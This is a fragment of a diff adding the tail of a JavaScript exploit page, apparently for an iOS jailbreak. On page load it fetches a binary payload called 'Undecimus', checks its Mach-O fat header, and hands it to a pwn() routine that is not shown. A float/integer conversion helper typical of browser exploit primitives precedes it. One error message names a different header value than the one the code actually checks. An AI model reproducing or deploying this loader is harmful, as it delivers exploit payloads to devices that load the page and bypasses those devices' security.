+    i32[1] = i / BASE32
+    return f64[0]
+}
+
+function go()
+{
+    try
+    {
+        var req = new XMLHttpRequest();
+        req.open('GET', 'Undecimus');
+        req.responseType = 'arraybuffer';
+        req.addEventListener('load', function()
+        {
+            try
+            {
+                if(req.responseType != 'arraybuffer')
+                {
+                    alert("y u no blob");
+                }
+                var arrayBuf = new Uint8Array(req.response);
+                var header = b2u32(arrayBuf.slice(0, 4)); // sanity check on the header
+                if(header != 0xbebafeca)
+                {
+                    alert(`header is invalid: ${hexit(header)}, should be 0xfeedfacf\nwtf is your payload??`);
+                    return;
+                }
+                alert(`header is valid: ${hexit(header)}, should be 0xbebafeca\nwtf is your payload??`);
+                pwn(arrayBuf);
+            }
+            catch(e)
+            {
+                fail('Error: ' + e + (e != null ? '\n' + e.stack : ''));
+            }
+        });
+        req.addEventListener('error', function(ev)
+        {
+            fail(ev);
+        });
+        req.send();
+    }
+    catch(e)
+    {
+        fail('Error: ' + e + (e != null ? '\n' + e.stack : ''));
+    }
+}
+go();
+</script>
